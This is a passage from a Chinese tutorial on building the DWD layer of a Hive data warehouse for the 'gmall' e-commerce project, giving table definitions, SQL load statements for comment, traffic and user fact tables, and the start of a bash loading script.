‘/warehouse/gmall/dwd/dwd_interaction_comment_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dwd_interaction_comment_inc partition(dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ods_comment_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’12’</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_interaction_comment_inc partition(dt=’2020-06-15’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ods_comment_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’12’</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><h3 id="流量域页面浏览事务事实表"><a href="#流量域页面浏览事务事实表" class="headerlink" title="流量域页面浏览事务事实表"></a>流量域页面浏览事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_page_view_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_page_view_inc</p><p>(</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`brand` STRING COMMENT ‘手机品牌’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`is_new` STRING COMMENT ‘是否首次启动’,</p><p>`model` STRING COMMENT ‘手机型号’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`operate_system` STRING COMMENT ‘操作系统’,</p><p>`user_id` STRING COMMENT ‘会员id’,</p><p>`version_code` STRING COMMENT ‘app版本号’,</p><p>`page_item` STRING COMMENT ‘目标id ‘,</p><p>`page_item_type` STRING COMMENT ‘目标类型’,</p><p>`last_page_id` STRING COMMENT ‘上页类型’,</p><p>`page_id` STRING COMMENT ‘页面ID ‘,</p><p>`source_type` STRING COMMENT ‘来源类型’,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`view_time` STRING COMMENT ‘跳入时间’,</p><p>`session_id` STRING COMMENT ‘所属会话id’,</p><p>`during_time` BIGINT COMMENT ‘持续时间毫秒’</p><p>) COMMENT ‘页面日志表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_traffic_page_view_inc’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_page_view_inc partition (dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) view_time,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ods_log_inc</p><p>where dt=’2020-06-14’</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="流量域启动事务事实表"><a href="#流量域启动事务事实表" class="headerlink" title="流量域启动事务事实表"></a>流量域启动事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_start_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_start_inc</p><p>(</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`brand` STRING COMMENT ‘手机品牌’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`is_new` STRING COMMENT ‘是否首次启动’,</p><p>`model` STRING COMMENT ‘手机型号’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`operate_system` STRING COMMENT ‘操作系统’,</p><p>`user_id` STRING COMMENT ‘会员id’,</p><p>`version_code` STRING COMMENT ‘app版本号’,</p><p>`entry` STRING COMMENT ‘icon手机图标 notice 通知’,</p><p>`open_ad_id` STRING COMMENT ‘广告页ID ‘,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`start_time` STRING COMMENT ‘启动时间’,</p><p>`loading_time_ms` BIGINT COMMENT ‘启动加载时间’,</p><p>`open_ad_ms` BIGINT COMMENT ‘广告总共播放时间’,</p><p>`open_ad_skip_ms` BIGINT COMMENT ‘用户跳过广告时点’</p><p>) COMMENT ‘启动日志表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_traffic_start_inc’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_start_inc partition(dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>`start`.entry,</p><p>`start`.loading_time,</p><p>`start`.open_ad_id,</p><p>`start`.open_ad_ms,</p><p>`start`.open_ad_skip_ms,</p><p>ts</p><p>from ods_log_inc</p><p>where dt=’2020-06-14’</p><p>and `start` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="流量域动作事务事实表"><a href="#流量域动作事务事实表" class="headerlink" title="流量域动作事务事实表"></a>流量域动作事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_action_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_action_inc</p><p>(</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`brand` STRING COMMENT ‘手机品牌’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`is_new` STRING COMMENT ‘是否首次启动’,</p><p>`model` STRING COMMENT ‘手机型号’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`operate_system` STRING COMMENT ‘操作系统’,</p><p>`user_id` STRING COMMENT ‘会员id’,</p><p>`version_code` STRING COMMENT ‘app版本号’,</p><p>`during_time` BIGINT COMMENT ‘持续时间毫秒’,</p><p>`page_item` STRING COMMENT ‘目标id ‘,</p><p>`page_item_type` STRING COMMENT ‘目标类型’,</p><p>`last_page_id` STRING COMMENT ‘上页类型’,</p><p>`page_id` STRING COMMENT ‘页面id ‘,</p><p>`source_type` STRING COMMENT ‘来源类型’,</p><p>`action_id` STRING COMMENT ‘动作id’,</p><p>`action_item` STRING COMMENT ‘目标id ‘,</p><p>`action_item_type` STRING COMMENT ‘目标类型’,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`action_time` STRING COMMENT ‘动作发生时间’</p><p>) COMMENT ‘动作日志表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_traffic_action_inc’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_action_inc partition(dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=’2020-06-14’</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="流量域曝光事务事实表"><a href="#流量域曝光事务事实表" class="headerlink" title="流量域曝光事务事实表"></a>流量域曝光事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_display_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_display_inc</p><p>(</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`brand` STRING COMMENT ‘手机品牌’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`is_new` STRING COMMENT ‘是否首次启动’,</p><p>`model` STRING COMMENT ‘手机型号’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`operate_system` STRING COMMENT ‘操作系统’,</p><p>`user_id` STRING COMMENT ‘会员id’,</p><p>`version_code` STRING COMMENT ‘app版本号’,</p><p>`during_time` BIGINT COMMENT ‘app版本号’,</p><p>`page_item` STRING COMMENT ‘目标id ‘,</p><p>`page_item_type` STRING COMMENT ‘目标类型’,</p><p>`last_page_id` STRING COMMENT ‘上页类型’,</p><p>`page_id` STRING COMMENT ‘页面ID ‘,</p><p>`source_type` STRING COMMENT ‘来源类型’,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`display_time` STRING COMMENT ‘曝光时间’,</p><p>`display_type` STRING COMMENT ‘曝光类型’,</p><p>`display_item` STRING COMMENT ‘曝光对象id ‘,</p><p>`display_item_type` STRING COMMENT ‘app版本号’,</p><p>`display_order` BIGINT COMMENT ‘曝光顺序’,</p><p>`display_pos_id` BIGINT COMMENT ‘曝光位置’</p><p>) COMMENT ‘曝光日志表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_traffic_display_inc’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_display_inc partition(dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.`order` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=’2020-06-14’</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="流量域错误事务事实表"><a href="#流量域错误事务事实表" class="headerlink" title="流量域错误事务事实表"></a>流量域错误事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_error_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_error_inc</p><p>(</p><p>`province_id` STRING COMMENT ‘地区编码’,</p><p>`brand` STRING COMMENT ‘手机品牌’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`is_new` STRING COMMENT ‘是否首次启动’,</p><p>`model` STRING COMMENT ‘手机型号’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`operate_system` STRING COMMENT ‘操作系统’,</p><p>`user_id` STRING COMMENT ‘会员id’,</p><p>`version_code` STRING COMMENT ‘app版本号’,</p><p>`page_item` STRING COMMENT ‘目标id ‘,</p><p>`page_item_type` STRING COMMENT ‘目标类型’,</p><p>`last_page_id` STRING COMMENT ‘上页类型’,</p><p>`page_id` STRING COMMENT ‘页面ID ‘,</p><p>`source_type` STRING COMMENT ‘来源类型’,</p><p>`entry` STRING COMMENT ‘icon手机图标 notice 通知’,</p><p>`loading_time` STRING COMMENT ‘启动加载时间’,</p><p>`open_ad_id` STRING COMMENT ‘广告页ID ‘,</p><p>`open_ad_ms` STRING COMMENT ‘广告总共播放时间’,</p><p>`open_ad_skip_ms` STRING COMMENT ‘用户跳过广告时点’,</p><p>`actions`<br>ARRAY&lt;STRUCT&lt;action_id:STRING,item:STRING,item_type:STRING,ts:BIGINT&gt;&gt;<br>COMMENT ‘动作信息’,</p><p>`displays` ARRAY&lt;STRUCT&lt;display_type :STRING,item :STRING,item_type<br>:STRING,`order` :STRING,pos_id</p><p>:STRING&gt;&gt; COMMENT ‘曝光信息’,</p><p>`date_id` STRING COMMENT ‘日期id’,</p><p>`error_time` STRING COMMENT ‘错误时间’,</p><p>`error_code` STRING COMMENT ‘错误码’,</p><p>`error_msg` STRING COMMENT ‘错误信息’</p><p>) COMMENT ‘错误日志表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_traffic_error_inc’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table dwd_traffic_error_inc partition(dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>`start`.entry,</p><p>`start`.loading_time,</p><p>`start`.open_ad_id,</p><p>`start`.open_ad_ms,</p><p>`start`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ods_log_inc</p><p>where dt=’2020-06-14’</p><p>and err is not null</p><p>)log</p><p>join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="用户域用户注册事务事实表"><a href="#用户域用户注册事务事实表" class="headerlink" title="用户域用户注册事务事实表"></a>用户域用户注册事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_user_register_inc;</p><p>CREATE EXTERNAL TABLE dwd_user_register_inc</p><p>(</p><p>`user_id` STRING COMMENT ‘用户ID’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`create_time` STRING COMMENT ‘注册时间’,</p><p>`channel` STRING COMMENT ‘应用下载渠道’,</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`version_code` STRING COMMENT ‘应用版本’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`brand` STRING COMMENT ‘设备品牌’,</p><p>`model` STRING COMMENT ‘设备型号’,</p><p>`operate_system` STRING COMMENT ‘设备操作系统’</p><p>) COMMENT ‘用户域用户注册事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_user_register_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_user_register_inc partition(dt)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ods_user_info_inc</p><p>where dt=’2020-06-14’</p><p>and type=’bootstrap-insert’</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ods_log_inc</p><p>where dt=’2020-06-14’</p><p>and page.page_id=’register’</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_user_register_inc partition(dt=’2020-06-15’)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ods_user_info_inc</p><p>where dt=’2020-06-15’</p><p>and type=’insert’</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ods_log_inc</p><p>where dt=’2020-06-15’</p><p>and page.page_id=’register’</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-15’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="用户域用户登录事务事实表"><a href="#用户域用户登录事务事实表" class="headerlink" title="用户域用户登录事务事实表"></a>用户域用户登录事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_user_login_inc;</p><p>CREATE EXTERNAL TABLE dwd_user_login_inc</p><p>(</p><p>`user_id` STRING COMMENT ‘用户ID’,</p><p>`date_id` STRING COMMENT ‘日期ID’,</p><p>`login_time` STRING COMMENT ‘登录时间’,</p><p>`channel` STRING COMMENT ‘应用下载渠道’,</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`version_code` STRING COMMENT ‘应用版本’,</p><p>`mid_id` STRING COMMENT ‘设备id’,</p><p>`brand` STRING COMMENT ‘设备品牌’,</p><p>`model` STRING COMMENT ‘设备型号’,</p><p>`operate_system` STRING COMMENT ‘设备操作系统’</p><p>) COMMENT ‘用户域用户登录事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_user_login_inc/‘</p><p>TBLPROPERTIES (“orc.compress” = “snappy”);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dwd_user_login_inc partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ods_log_inc</p><p>where dt=’2020-06-14’</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=’2020-06-14’</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><h3 id="数据装载脚本-2"><a href="#数据装载脚本-2" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h3><h4 id="首日装载脚本-1"><a href="#首日装载脚本-1" class="headerlink" title="首日装载脚本"></a>首日装载脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建ods_to_dwd_init.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dwd_init.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>echo “请传入日期参数”</p><p>exit</p><p>fi</p><p>dwd_interaction_comment_inc=”</p><p>insert overwrite table ${APP}.dwd_interaction_comment_inc partition(dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ${APP}.ods_comment_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’12’</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p>“</p><p>dwd_interaction_favor_add_inc=”</p><p>insert overwrite table ${APP}.dwd_interaction_favor_add_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,’yyyy-MM-dd’) date_id,</p><p>data.create_time,</p><p>date_format(data.create_time,’yyyy-MM-dd’)</p><p>from ${APP}.ods_favor_info_inc</p><p>where dt=’$do_date’</p><p>and type = ‘bootstrap-insert’;</p><p>“</p><p>dwd_tool_coupon_get_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_get_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,’yyyy-MM-dd’) date_id,</p><p>data.get_time,</p><p>date_format(data.get_time,’yyyy-MM-dd’)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’;</p><p>“</p><p>dwd_tool_coupon_order_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_order_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,’yyyy-MM-dd’) date_id,</p><p>data.using_time,</p><p>date_format(data.using_time,’yyyy-MM-dd’)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>and data.using_time is not null;</p><p>“</p><p>dwd_tool_coupon_pay_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_pay_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,’yyyy-MM-dd’) date_id,</p><p>data.used_time,</p><p>date_format(data.used_time,’yyyy-MM-dd’)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>and data.used_time is not null;</p><p>“</p><p>dwd_trade_cancel_detail_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_cancel_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,’yyyy-MM-dd’) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(canel_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>and data.order_status=’1003’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from 